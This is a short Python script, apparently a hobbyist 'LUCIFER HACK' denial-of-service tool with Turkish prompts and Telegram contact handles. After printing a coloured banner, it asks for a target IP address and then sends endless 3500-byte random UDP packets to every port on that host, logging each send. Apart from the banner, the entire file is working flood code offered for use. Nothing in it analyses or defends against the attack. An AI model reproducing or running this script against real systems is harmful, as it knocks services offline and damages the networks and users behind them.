import socket
import os
import random
import time
import gradient_figlet as gf
from colour import Color
from pyfiglet import Figlet

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
#####################
exelans = Figlet(font="doom", width=160)
gf.print_with_gradient(exelans.renderText("LUCIFER HACK"), Color("#E13556"), Color("#FFDD00"))
print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Author : LUCIFER" + N + "   LUCIFER Dos From - " + B + "" + R + "WH1T3" + N)
print()
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : LUCIFER \033[0m")
print("\033[33mTelegram       : @redcavalry")
print("\033[33mKanal          : @anonymaus\033[0m")
print("\033[32m================================================================\033[0m")
print()

ip = input("[+] HEDEF IP ADRESİ GİR : ")
os.system("clear")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
